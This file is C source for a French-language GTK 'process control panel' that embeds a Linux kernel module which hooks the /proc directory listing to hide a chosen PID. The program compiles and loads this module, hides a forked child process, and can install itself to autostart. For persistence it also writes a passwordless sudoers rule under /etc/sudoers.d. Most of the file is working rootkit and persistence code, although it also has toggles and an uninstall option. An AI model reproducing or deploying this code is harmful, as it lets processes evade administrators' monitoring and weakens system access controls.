#include <gtk/gtk.h>
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <linux/limits.h>
#include <pwd.h> 

// =================================================================================
// SECTION 1 : MODULE NOYAU ET AUTRES SOURCES EMBARQUÉES
// =================================================================================

const char *hide_pid_c_source =
    "#include <linux/module.h>\n"
    "#include <linux/version.h>"
    "#include <linux/kernel.h>\n"
    "#include <linux/init.h>\n"
    "#include <linux/fs.h>\n"
    "#include <linux/namei.h>\n"
    "#include <linux/string.h>\n"
    "#include <linux/types.h>\n\n"
    "static char* pid_to_hide_str = \"\";\n"
    "module_param(pid_to_hide_str, charp, 0644);\n"
    "static const struct file_operations *original_proc_fops;\n"
    "static struct file_operations hacked_proc_fops;\n"
    "static int (*original_iterate_shared) (struct file *, struct dir_context *);\n"
    "static struct dir_context *original_ctx;\n"
    "static int hacked_iterate_shared(struct file *file, struct dir_context *ctx);\n\n"
    "#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)\n"
    "static int hacked_filldir(struct dir_context *ctx, const char *name, int namelen,\n"
    "        loff_t off, u64 ino, unsigned int d_type)\n"
    "{\n"
    "    if (strncmp(name, pid_to_hide_str, strlen(pid_to_hide_str)) == 0) return 0;\n"
    "    return original_ctx->actor(original_ctx, name, namelen, off, ino, d_type);\n"
    "}\n"
    "#else\n"
    "static bool hacked_filldir(struct dir_context *ctx, const char *name, int namelen,\n"
    "        loff_t off, u64 ino, unsigned int d_type)\n"
    "{\n"
    "    if (strncmp(name, pid_to_hide_str, strlen(pid_to_hide_str)) == 0) return true;\n"
    "    return original_ctx->actor(original_ctx, name, namelen, off, ino, d_type);\n"
    "}\n"
    "#endif\n\n"
    "int hacked_iterate_shared(struct file *file, struct dir_context *ctx)\n"
    "{\n"
    "    original_ctx = ctx;\n"
    "    struct dir_context hacked_ctx = { .actor = hacked_filldir, .pos = ctx->pos };\n"
    "    int result = original_iterate_shared(file, &hacked_ctx);\n"
    "    ctx->pos = hacked_ctx.pos;\n"
    "    return result;\n"
    "}\n\n"
    "static int __init phide_init(void)\n"
    "{\n"
    "    struct path p; struct inode *proc_inode;\n"
    "    if (strlen(pid_to_hide_str) == 0) { return -EINVAL; }\n"
    "    if (kern_path(\"/proc\", 0, &p)) { return 0; }\n"
    "    proc_inode = p.dentry->d_inode;\n"
    "    original_proc_fops = proc_inode->i_fop;\n"
    "    memcpy(&hacked_proc_fops, original_proc_fops, sizeof(struct file_operations));\n"
    "    original_iterate_shared = original_proc_fops->iterate_shared;\n"
    "    hacked_proc_fops.iterate_shared = hacked_iterate_shared;\n"
    "    proc_inode->i_fop = &hacked_proc_fops;\n"
    "    path_put(&p);\n"
    "    return 0;\n"
    "}\n\n"
    "static void __exit phide_exit(void)\n"
    "{\n"
    "    struct path p; struct inode *proc_inode;\n"
    "    if (kern_path(\"/proc\", 0, &p)) { return; }\n"
    "    proc_inode = p.dentry->d_inode;\n"
    "    proc_inode->i_fop = original_proc_fops;\n"
    "    path_put(&p);\n"
    "}\n\n"
    "module_init(phide_init);\n"
    "module_exit(phide_exit);\n"
    "MODULE_LICENSE(\"GPL\");\n";

const char *makefile_source = "obj-m += hide_pid.o\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";
const char *startup_script_source = "#!/bin/bash\nsudo /opt/my_hidden_process/my_hidden_process\n";
const char *desktop_entry_source_script = "[Desktop Entry]\nType=Application\nName=Process Hider GUI\nExec=/opt/my_hidden_process/start_gui.sh\nTerminal=false\n";

// =================================================================================
// SECTION 2 : VARIABLES GLOBALES ET WIDGETS UI
// =================================================================================

static GtkWidget *cmd_textview;
static GtkWidget *btn_hide, *btn_unhide, *btn_run_ps, *btn_add_startup, *btn_remove_startup;
static GtkListStore *pcb_list_store;
static const char* build_dir = "/tmp/hidden_process_build";
static const char* install_dir = "/opt/my_hidden_process";
static const char* pid_file_path = "/tmp/my_hidden_process.pid";
static pid_t child_pid = -1;
volatile sig_atomic_t keep_running = 1;
static gboolean is_child_hidden = FALSE;

// =================================================================================
// SECTION 3 : FONCTIONS UTILITAIRES
// =================================================================================

void log_to_cmdline(const char *format, ...) {
    char buffer[1024];
    va_list args; va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    GtkTextBuffer *text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(cmd_textview));
    GtkTextIter end_iter;
    gtk_text_buffer_get_end_iter(text_buffer, &end_iter);
    gtk_text_buffer_insert(text_buffer, &end_iter, buffer, -1);
    gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(cmd_textview), gtk_text_buffer_get_insert(text_buffer), 0.0, TRUE, 0.5, 1.0);
}

int run_command_silent(const char *cmd) {
    char* silent_cmd = g_strdup_printf("%s > /dev/null 2>&1", cmd);
    int status = system(silent_cmd);
    g_free(silent_cmd);
    return status;
}

int write_file_silent(const char *path, const char *content) {
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    fprintf(f, "%s", content);
    fclose(f);
    return 0;
}

void update_visibility_buttons_state() {
    gtk_widget_set_sensitive(btn_hide, !is_child_hidden);
    gtk_widget_set_sensitive(btn_unhide, is_child_hidden);
}

gboolean get_original_user_info(gchar **username, gchar **home_dir) {
    uid_t user_id = (uid_t)-1;
    struct passwd *pw = NULL;
    const char *uid_str = getenv("PKEXEC_UID");
    if (!uid_str) uid_str = getenv("SUDO_UID");

    if (uid_str) {
        user_id = strtol(uid_str, NULL, 10);
        pw = getpwuid(user_id);
    }

    if (pw) {
        if (username) *username = g_strdup(pw->pw_name);
        if (home_dir) *home_dir = g_strdup(pw->pw_dir);
        return TRUE;
    }
    return FALSE;
}

void update_startup_buttons_state() {
    gchar* home_dir = NULL;
    if (!get_original_user_info(NULL, &home_dir)) {
        gtk_widget_set_sensitive(btn_add_startup, FALSE);
        gtk_widget_set_sensitive(btn_remove_startup, FALSE);
        return;
    }
    gchar* desktop_file_path = g_build_filename(home_dir, ".config", "autostart", "proc-hider-gui.desktop", NULL);
    if (g_file_test(desktop_file_path, G_FILE_TEST_EXISTS)) {
        gtk_widget_set_sensitive(btn_add_startup, FALSE);
        gtk_widget_set_sensitive(btn_remove_startup, TRUE);
    } else {
        gtk_widget_set_sensitive(btn_add_startup, TRUE);
        gtk_widget_set_sensitive(btn_remove_startup, FALSE);
    }
    g_free(home_dir);
    g_free(desktop_file_path);
}

void child_sigterm_handler(int signum) { keep_running = 0; }

void populate_pcb_from_pid(pid_t pid) {
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/status", pid);

    FILE *fp = fopen(proc_path, "r");
    if (!fp) {
        log_to_cmdline("AVERTISSEMENT: Impossible de lire %s pour peupler les infos PCB.\n", proc_path);
        return;
    }

    gtk_list_store_clear(pcb_list_store);
    GtkTreeIter iter;
    char line[256];

    while (fgets(line, sizeof(line), fp)) {
        gchar **parts = g_strsplit(line, ":\t", 2);
        if (parts[0] && parts[1]) {
            g_strstrip(parts[1]);
            gtk_list_store_append(pcb_list_store, &iter);
            gtk_list_store_set(pcb_list_store, &iter, 0, parts[0], 1, parts[1], -1);
        }
        g_strfreev(parts);
    }
    fclose(fp);
}

void parse_and_send_proc_status(int pipe_fd) {
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return;
    char line[256], output_buffer[4096] = "";
    while(fgets(line, sizeof(line), fp)) {
        char *key = strtok(line, ":\t");
        char *value = strtok(NULL, "\n");
        if (key && value) {
            while (*value == ' ' || *value == '\t') value++;
            snprintf(output_buffer + strlen(output_buffer), sizeof(output_buffer) - strlen(output_buffer), "%s|%s\n", key, value);
        }
    }
    fclose(fp);
    write(pipe_fd, output_buffer, strlen(output_buffer));
}

void child_process_function(int pipe_fd) {
    signal(SIGTERM, child_sigterm_handler); signal(SIGINT, child_sigterm_handler);
    parse_and_send_proc_status(pipe_fd);
    close(pipe_fd);
    while (keep_running) { sleep(1); }
    exit(0);
}

// =================================================================================
// SECTION 4 : SÉQUENCE DE DÉMARRAGE ET CALLBACKS
// =================================================================================

gboolean on_child_data_received(GIOChannel *source, GIOCondition condition, gpointer data) {
    gchar *buffer = NULL; gsize len;
    g_io_channel_read_to_end(source, &buffer, &len, NULL);
    if (buffer) {
        gtk_list_store_clear(pcb_list_store);
        GtkTreeIter iter;
        gchar **lines = g_strsplit(buffer, "\n", -1);
        for (int i = 0; lines[i] != NULL && *lines[i] != '\0'; i++) {
            gchar **parts = g_strsplit(lines[i], "|", 2);
            if (parts[0] && parts[1]) {
                gtk_list_store_append(pcb_list_store, &iter);
                gtk_list_store_set(pcb_list_store, &iter, 0, parts[0], 1, parts[1], -1);
            }
            g_strfreev(parts);
        }
        g_strfreev(lines);
        g_free(buffer);
    }
    return G_SOURCE_REMOVE;
}

gboolean startup_sequence_async(gpointer user_data) {
    if (geteuid() != 0) {
        log_to_cmdline("ERREUR : Doit être lancé avec 'sudo'.\n");
        return G_SOURCE_REMOVE;
    }

    FILE* pid_f = fopen(pid_file_path, "r");
    if (pid_f) {
        pid_t existing_pid = 0;
        fscanf(pid_f, "%d", &existing_pid);
        fclose(pid_f);
        if (existing_pid > 0 && kill(existing_pid, 0) == 0) {
            child_pid = existing_pid;
            log_to_cmdline("Processus existant trouvé (PID: %d). Attachement en cours...\n", child_pid);
            populate_pcb_from_pid(child_pid);
            
            run_command_silent("rmmod hide_pid");
            char* cmd = g_strdup_printf("insmod %s/hide_pid.ko pid_to_hide_str=%d", install_dir, child_pid);
            run_command_silent(cmd); g_free(cmd);
            is_child_hidden = TRUE;
            
            gtk_widget_set_sensitive(btn_run_ps, TRUE);
            update_visibility_buttons_state();
            update_startup_buttons_state();
            log_to_cmdline("Prêt. Attaché au processus existant.\n");
            return G_SOURCE_REMOVE;
        }
    }

    log_to_cmdline("Aucun processus existant trouvé. Création d'un nouveau processus...\n");
    char *cmd = g_strdup_printf("rm -rf %s && mkdir -p %s", build_dir, build_dir);
    run_command_silent(cmd); g_free(cmd);

    char *file_path = g_strdup_printf("%s/hide_pid.c", build_dir);
    write_file_silent(file_path, hide_pid_c_source); g_free(file_path);

    file_path = g_strdup_printf("%s/Makefile", build_dir);
    write_file_silent(file_path, makefile_source); g_free(file_path);

    cmd = g_strdup_printf("cd %s && make", build_dir);
    if (run_command_silent(cmd) == 0) {
        g_free(cmd);
        cmd = g_strdup_printf("mkdir -p %s", install_dir); run_command_silent(cmd); g_free(cmd);
        cmd = g_strdup_printf("cp %s/hide_pid.ko %s/hide_pid.ko", build_dir, install_dir);
        if (run_command_silent(cmd) != 0) { log_to_cmdline("ERREUR: Échec de l'installation du module.\n"); g_free(cmd); return G_SOURCE_REMOVE; }
        g_free(cmd);
    } else { log_to_cmdline("ERREUR: Échec de la compilation du module.\n"); g_free(cmd); return G_SOURCE_REMOVE; }

    int p[2];
    if (pipe(p) == -1) { log_to_cmdline("ERREUR: pipe() a échoué.\n"); return G_SOURCE_REMOVE; }
    pid_t pid = fork();
    if (pid < 0) { log_to_cmdline("ERREUR: fork() a échoué!\n"); return G_SOURCE_REMOVE; }
    if (pid == 0) { close(p[0]); child_process_function(p[1]); }
    else {
        close(p[1]);
        child_pid = pid;

        FILE* pid_f_write = fopen(pid_file_path, "w");
        if(pid_f_write) {
            fprintf(pid_f_write, "%d", child_pid);
            fclose(pid_f_write);
        }

        run_command_silent("rmmod hide_pid");
        cmd = g_strdup_printf("insmod %s/hide_pid.ko pid_to_hide_str=%d", install_dir, child_pid);
        run_command_silent(cmd); g_free(cmd);
        is_child_hidden = TRUE;

        GIOChannel *channel = g_io_channel_unix_new(p[0]);
        g_io_add_watch(channel, G_IO_IN, on_child_data_received, NULL);
        g_io_channel_unref(channel);
        
        gtk_widget_set_sensitive(btn_run_ps, TRUE);
        update_visibility_buttons_state();
        update_startup_buttons_state();
        log_to_cmdline("Prêt. Le processus enfant (PID: %d) a été créé et caché.\n", child_pid);
    }
    return G_SOURCE_REMOVE;
}

static void on_hide_process_clicked(GtkWidget *w, gpointer d) {
    if (child_pid <= 0) { return; }
    run_command_silent("rmmod hide_pid");
    char* command = g_strdup_printf("insmod %s/hide_pid.ko pid_to_hide_str=%d", install_dir, child_pid);
    if (run_command_silent(command) == 0) {
        log_to_cmdline("Processus caché.\n");
        is_child_hidden = TRUE;
        update_visibility_buttons_state();
    } else {
        log_to_cmdline("ERREUR: Échec du chargement du module noyau.\n");
    }
    g_free(command);
}

static void on_unhide_process_clicked(GtkWidget *w, gpointer d) {
    if (run_command_silent("rmmod hide_pid") == 0) {
        log_to_cmdline("Processus visible.\n");
        is_child_hidden = FALSE;
        update_visibility_buttons_state();
    } else {
        log_to_cmdline("ERREUR: Échec du déchargement du module.\n");
    }
}

static void on_run_ps_clicked(GtkWidget *w, gpointer d) {
    if (child_pid <= 0) { return; }
    log_to_cmdline("Ouverture d'un terminal pour surveiller le PID %d...\n", child_pid);
    char* command = g_strdup_printf("gnome-terminal -- watch -n 1 \"ps -p %d -o pid,ppid,cmd,stat,user\"", child_pid);
    if (system(command) != 0) {
         g_free(command);
         command = g_strdup_printf("xterm -e \"watch -n 1 'ps -p %d -o pid,ppid,cmd,stat,user'\"", child_pid);
         system(command);
    }
    g_free(command);
}

static void on_add_to_startup_clicked(GtkWidget *widget, gpointer data) {
    gchar *username = NULL, *home_dir = NULL;
    if (!get_original_user_info(&username, &home_dir)) {
        log_to_cmdline("ERREUR: Impossible de trouver les informations de l'utilisateur.\n");
        return;
    }
    
    log_to_cmdline("Ajout de l'application au démarrage...\n");
    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len != -1) self_path[len] = '\0'; else { g_free(username); g_free(home_dir); return; }

    char *cmd = g_strdup_printf("mkdir -p %s", install_dir); run_command_silent(cmd); g_free(cmd);
    cmd = g_strdup_printf("cp %s %s/my_hidden_process", self_path, install_dir); run_command_silent(cmd); g_free(cmd);
    
    char* script_path = g_build_filename(install_dir, "start_gui.sh", NULL);
    write_file_silent(script_path, startup_script_source);
    cmd = g_strdup_printf("chmod +x %s", script_path); run_command_silent(cmd); g_free(cmd);
    
    gchar* autostart_dir = g_build_filename(home_dir, ".config", "autostart", NULL);
    cmd = g_strdup_printf("mkdir -p %s", autostart_dir); run_command_silent(cmd); g_free(cmd);

    gchar* desktop_file_path = g_build_filename(autostart_dir, "proc-hider-gui.desktop", NULL);
    write_file_silent(desktop_file_path, desktop_entry_source_script);

    cmd = g_strdup_printf("chown %s:%s %s", username, username, desktop_file_path);
    run_command_silent(cmd); g_free(cmd);

   
    char* sudoers_rule = g_strdup_printf("%s ALL=(ALL) NOPASSWD: %s", username, "/opt/my_hidden_process/my_hidden_process");
    char* sudoers_file_path = g_strdup_printf("/etc/sudoers.d/99-proc-hider");
    write_file_silent(sudoers_file_path, sudoers_rule);
    cmd = g_strdup_printf("chmod 0440 %s", sudoers_file_path); run_command_silent(cmd); g_free(cmd);

    g_free(username); g_free(home_dir); g_free(autostart_dir); g_free(desktop_file_path);
    g_free(script_path); g_free(sudoers_rule); g_free(sudoers_file_path);

    log_to_cmdline("SUCCÈS: Application ajoutée au démarrage.\n");
    update_startup_buttons_state();
}

static void on_remove_from_startup_clicked(GtkWidget *widget, gpointer data) {
    gchar* home_dir = NULL;
    if (!get_original_user_info(NULL, &home_dir)) {
        log_to_cmdline("ERREUR: Impossible de trouver le répertoire de l'utilisateur.\n");
        return;
    }
    
    log_to_cmdline("Suppression de l'application du démarrage...\n");
    
    gchar* desktop_file_path = g_build_filename(home_dir, ".config", "autostart", "proc-hider-gui.desktop", NULL);
    char* cmd = g_strdup_printf("rm -f %s", desktop_file_path);
    run_command_silent(cmd); g_free(cmd);

    run_command_silent("rm -f /etc/sudoers.d/99-proc-hider");

    if (!g_file_test(desktop_file_path, G_FILE_TEST_EXISTS)) {
        log_to_cmdline("SUCCÈS: Entrée de démarrage et configuration sudo supprimées.\n");
        
    } else {
        log_to_cmdline("ERREUR: La suppression a échoué.\n");
    }
    
    g_free(home_dir);
    g_free(desktop_file_path);
    update_startup_buttons_state();
}

static void on_app_destroy(GtkWidget *w, gpointer d) {
    log_to_cmdline("Fermeture de l'interface. Le processus en arrière-plan continue de fonctionner.\n");
    run_command_silent("rmmod hide_pid");
    gtk_main_quit();
}

static void on_window_map(GtkWidget *widget, GdkEvent *event, gpointer user_data) {
    gtk_window_maximize(GTK_WINDOW(widget));
    g_signal_handlers_disconnect_by_func(widget, G_CALLBACK(on_window_map), user_data);
}

// =================================================================================
// SECTION 5 : FONCTION MAIN ET MISE EN PAGE DE L'UI
// =================================================================================

GtkWidget* create_pcb_view() {
    GtkWidget *treeview = gtk_tree_view_new();
    GtkCellRenderer *renderer = gtk_cell_renderer_text_new();
    gtk_tree_view_append_column(GTK_TREE_VIEW(treeview), gtk_tree_view_column_new_with_attributes("Attribut", renderer, "text", 0, NULL));
    gtk_tree_view_append_column(GTK_TREE_VIEW(treeview), gtk_tree_view_column_new_with_attributes("Valeur", renderer, "text", 1, NULL));
    pcb_list_store = gtk_list_store_new(2, G_TYPE_STRING, G_TYPE_STRING);
    gtk_tree_view_set_model(GTK_TREE_VIEW(treeview), GTK_TREE_MODEL(pcb_list_store));
    return treeview;
}

int perform_uninstall() {
    if (geteuid() != 0) {
        fprintf(stderr, "ERREUR : L'option --uninstall doit être lancée avec 'sudo'.\n");
        return 1;
    }

    printf("Désinstallation en cours...\n");

    printf(" - Suppression de la règle sudoers...\n");
    run_command_silent("rm -f /etc/sudoers.d/99-proc-hider");

    
    printf(" - Suppression du répertoire d'installation (/opt/my_hidden_process)...\n");
    run_command_silent("rm -rf /opt/my_hidden_process");

    gchar* home_dir = NULL;
    if (get_original_user_info(NULL, &home_dir)) {
        gchar* desktop_file_path = g_build_filename(home_dir, ".config", "autostart", "proc-hider-gui.desktop", NULL);
        printf(" - Suppression de l'entrée de démarrage (%s)...\n", desktop_file_path);
        gchar* cmd = g_strdup_printf("rm -f %s", desktop_file_path);
        run_command_silent(cmd);
        g_free(cmd);
        g_free(desktop_file_path);
        g_free(home_dir);
    } else {
        printf(" - AVERTISSEMENT: Impossible de déterminer l'utilisateur original pour supprimer l'entrée de démarrage.\n");
    }


    printf(" - Suppression du répertoire de compilation temporaire...\n");
    run_command_silent("rm -rf /tmp/hidden_process_build");

    printf(" - Suppression du fichier PID...\n");
    run_command_silent("rm -f /tmp/my_hidden_process.pid");

    printf(" - Déchargement du module noyau (hide_pid)...\n");
    run_command_silent("rmmod hide_pid"); 

    printf("Désinstallation terminée.\n");
    return 0;
}

int main(int argc, char *argv[]) {
    
    if (argc == 2 && strcmp(argv[1], "--uninstall") == 0) {
        return perform_uninstall();
    }
    
    gtk_init(&argc, &argv);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(window), "Panneau de Contrôle Processus");
    gtk_window_set_default_size(GTK_WINDOW(window), 1000, 600);
    g_signal_connect(window, "destroy", G_CALLBACK(on_app_destroy), NULL);
    g_signal_connect(window, "map-event", G_CALLBACK(on_window_map), NULL);

    GtkWidget *grid = gtk_grid_new();
    gtk_grid_set_column_spacing(GTK_GRID(grid), 10);
    gtk_container_add(GTK_CONTAINER(window), grid);

    GtkWidget *button_box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    gtk_grid_attach(GTK_GRID(grid), button_box, 0, 0, 1, 1);

    btn_hide = gtk_button_new_with_label("Cacher le Processus");
    btn_unhide = gtk_button_new_with_label("Afficher le Processus");
    btn_run_ps = gtk_button_new_with_label("Vérifier avec 'ps'");
    btn_add_startup = gtk_button_new_with_label("Ajouter au Démarrage");
    btn_remove_startup = gtk_button_new_with_label("Retirer du Démarrage");
    
    gtk_box_pack_start(GTK_BOX(button_box), btn_hide, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(button_box), btn_unhide, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(button_box), gtk_separator_new(GTK_ORIENTATION_HORIZONTAL), FALSE, FALSE, 10);
    gtk_box_pack_start(GTK_BOX(button_box), btn_run_ps, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(button_box), gtk_separator_new(GTK_ORIENTATION_HORIZONTAL), FALSE, FALSE, 10);
    gtk_box_pack_start(GTK_BOX(button_box), btn_add_startup, FALSE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(button_box), btn_remove_startup, FALSE, FALSE, 0);

    GtkWidget *cmd_scrolled_window = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_hexpand(cmd_scrolled_window, TRUE); gtk_widget_set_vexpand(cmd_scrolled_window, TRUE);
    cmd_textview = gtk_text_view_new();
    gtk_text_view_set_editable(GTK_TEXT_VIEW(cmd_textview), FALSE);
    gtk_text_view_set_monospace(GTK_TEXT_VIEW(cmd_textview), TRUE);
    gtk_container_add(GTK_CONTAINER(cmd_scrolled_window), cmd_textview);
    gtk_grid_attach(GTK_GRID(grid), cmd_scrolled_window, 1, 0, 1, 1);

    GtkCssProvider *css = gtk_css_provider_new();
    gtk_css_provider_load_from_data(css, "textview { color: #00FF00; background-color: #101010; font-family: monospace; }", -1, NULL);
    gtk_style_context_add_provider(gtk_widget_get_style_context(cmd_textview), GTK_STYLE_PROVIDER(css), GTK_STYLE_PROVIDER_PRIORITY_USER);

    GtkWidget *pcb_scrolled_window = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(pcb_scrolled_window, 350, -1);
    gtk_container_add(GTK_CONTAINER(pcb_scrolled_window), create_pcb_view());
    gtk_grid_attach(GTK_GRID(grid), pcb_scrolled_window, 2, 0, 1, 1);

    log_to_cmdline("Initialisation en cours...\n");
    gtk_widget_set_sensitive(btn_hide, FALSE);
    gtk_widget_set_sensitive(btn_unhide, FALSE);
    gtk_widget_set_sensitive(btn_run_ps, FALSE);
    update_startup_buttons_state();

    g_signal_connect(btn_hide, "clicked", G_CALLBACK(on_hide_process_clicked), NULL);
    g_signal_connect(btn_unhide, "clicked", G_CALLBACK(on_unhide_process_clicked), NULL);
    g_signal_connect(btn_run_ps, "clicked", G_CALLBACK(on_run_ps_clicked), NULL);
    g_signal_connect(btn_add_startup, "clicked", G_CALLBACK(on_add_to_startup_clicked), NULL);
    g_signal_connect(btn_remove_startup, "clicked", G_CALLBACK(on_remove_from_startup_clicked), NULL);

    gtk_widget_show_all(window);
    g_idle_add(startup_sequence_async, NULL);
    
    gtk_main();
    return 0;
}
